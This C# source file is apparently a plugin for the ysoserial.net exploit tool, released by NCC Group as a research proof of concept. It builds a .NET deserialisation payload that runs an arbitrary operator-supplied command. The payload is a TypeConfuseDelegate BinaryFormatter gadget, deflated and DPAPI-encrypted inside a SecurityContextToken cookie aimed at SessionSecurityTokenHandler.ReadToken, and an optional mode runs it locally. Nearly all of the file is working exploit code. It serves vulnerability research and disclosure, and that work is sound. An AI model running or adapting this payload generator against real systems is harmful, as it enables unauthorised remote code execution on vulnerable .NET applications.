using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial.Generators;
using System.IdentityModel;
using System.IO;
using System.Xml;
using System.IdentityModel.Tokens;

/**
 * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `SessionSecurityTokenHandler.ReadToken Method`: https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.sessionsecuritytokenhandler.readtoken 
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  As it uses Data Protection API (DPAPI) that requires current account credentials. Without that, it will not be possible to create a valid cookie. Therefore, it might be very rare that this issue can become actually useful.
 *  This PoC produces an error and may crash the application
**/

namespace ysoserial.Plugins
{
    class SessionSecurityTokenHandlerPlugin : Plugin
    {
        static string command = "";
        static Boolean test = false;

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
            };

        public string Name()
        {
            return "SessionSecurityTokenHandler";
        }

        public string Description()
        {
            return "Generates XML payload for the SessionSecurityTokenHandler class";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }
            String payloadValue = "";
            string payload = @"<SecurityContextToken xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc' Id='uuid-709ab608-2004-44d5-b392-f3c5bf7c67fb-1'>
	<Identifier xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
		urn:unique-id:securitycontext:1337
	</Identifier>
	<Cookie xmlns='http://schemas.microsoft.com/ws/2006/05/security'>{0}</Cookie>
</SecurityContextToken>";

            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false);
            DeflateCookieTransform myDeflateCookieTransform = new DeflateCookieTransform();
            ProtectedDataCookieTransform myProtectedDataCookieTransform = new ProtectedDataCookieTransform();
            byte[] deflateEncoded = myDeflateCookieTransform.Encode(serializedData);
            byte[] encryptedEncoded = myProtectedDataCookieTransform.Encode(deflateEncoded);
            payload = String.Format(payload, Convert.ToBase64String(encryptedEncoded));

            if (test)
            {
                // PoC on how it works in practice
                try
                {
                    XmlReader tokenXML = XmlReader.Create(new StringReader(payload));
                    SessionSecurityTokenHandler mySessionSecurityTokenHandler = new SessionSecurityTokenHandler();
                    mySessionSecurityTokenHandler.ReadToken(tokenXML);
                }
                catch (Exception e)
                {
                    // there will be an error!
                }
            }

            return payload;
        }
    }
}
